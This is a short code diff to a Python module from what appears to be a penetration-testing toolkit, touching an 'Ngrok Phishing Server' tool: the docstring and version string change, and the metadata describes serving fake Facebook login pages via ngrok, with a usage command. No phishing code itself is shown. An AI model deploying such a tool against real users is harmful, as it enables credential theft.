@@ -1,4 +1,8 @@
-"""Ngrok-based Phishing Server for Educational Purposes"""
+"""
+Ngrok-based Phishing Server for Educational Purposes
+
+V3.0 Major Patch: Enhanced accuracy, powerful features, and standardized output.
+"""
 import json
 import threading
 import time
@@ -17,7 +21,7 @@ class NgrokPhishing(BaseTool):
         metadata = ToolMetadata(
             name="Ngrok Phishing Server",
             category=ToolCategory.PHISHING,
-            version="3.3.0",
+            version="3.0.0",
             author="Aleocrophic Team",
             description="Deploy phishing pages via ngrok for educational cyber attack demonstration",
             usage="aleopantest run ngrok-phishing --type login --target facebook --ngrok_token YOUR_TOKEN",
